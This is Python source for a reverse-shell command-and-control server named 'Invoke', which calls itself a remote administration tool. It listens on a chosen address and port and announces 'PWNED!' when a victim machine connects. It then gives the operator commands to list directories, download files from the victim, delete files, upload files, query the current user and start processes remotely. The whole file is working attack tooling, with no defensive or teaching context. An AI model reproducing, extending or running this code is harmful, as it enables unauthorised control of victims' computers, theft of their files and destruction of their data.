#Modules
import os, socket, getpass, pyfiglet, argparse
os.system('cls' if os.name == 'nt' else 'clear')

#Arguments
parser = argparse.ArgumentParser(prog = 'Invoke', description = 'Remote administration tool', epilog = 'Copyright, private software.')
parser.add_argument('--lhost', '-l', type=str, required=True, help="IP to listen on for reverse connections")
parser.add_argument('--lport', '-p', type=int, required=True, help="Port to listen on for reverse connections")
args = parser.parse_args()

#Menu
banner = pyfiglet.figlet_format("Invoke")
print(banner)

#Inputs
host = args.lhost
port = args.lport

#Config
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.bind((host,port))
print("")
print("Server is currently running at", host, ":", port)
print("")
print("Waiting for incoming connections....")
s.listen(1)
conn, addr = s.accept()

print("")
print(addr, "PWNED!")

#Shell
while True:
    print()
    i = input(str("Shell >> "))
    if i == "getcwd":
        conn.send(i.encode())
        files = conn.recv(5000)
        files = files.decode()
        print()
        print("Output: ", files)
    elif i == "listdir":
        conn.send(i.encode())
        print()
        u = input(str("Custom Directory >> "))
        conn.send(u.encode())
        files = conn.recv(5000)
        files = files.decode()
        print()
        print("Output: ", files)
    elif i == "download":
        conn.send(i.encode())
        print()
        u = input(str("File Path >> "))
        conn.send(u.encode())
        file = conn.recv(100000)
        print()
        filename = input(str("New Filename >> "))
        new_file = open(filename, "wb")
        new_file.write(file)
        new_file.close()
        print()
        print("File downloaded and saved as", filename)
    elif i == "delete":
        conn.send(i.encode())
        print()
        u = input(str("File Path >> "))
        conn.send(u.encode())
        print()
        print("File Deleted!")
    elif i == "send":
        conn.send(i.encode())
        print()
        u = input(str("File Path >> "))
        print()
        filename = input(str("New Filename >> "))
        data = open(u, "rb")
        file_data = data.read(7000)
        conn.send(filename.encode())
        print()
        print("File Sent!")
        conn.send(file_data)
    elif i == "who":
        conn.send(i.encode())
        files = conn.recv(5000)
        files = files.decode()
        print()
        print("Output: ", files)
    elif i == "init":
        conn.send(i.encode())
        p = input(str("File Path >> "))
        conn.send(p.encode())
        files = conn.recv(5000)
        file = files.decode()
        print("Process Opened!")
    elif i == "exit":
        exit()
    elif i == "help":
        print()
        print("Commands: ")
        print("getcwd - Gets Current Working Directory")
        print("listdir - List All Files in a Directory")
        print("download - Download a File")
        print("delete - Delete a File")
        print("send - Send a File")
        print("who - Shows You the Current User")
        print("init - Starts Process")
        print("exit - Exit Program")
        print()
    else:
        print()
        print("Error")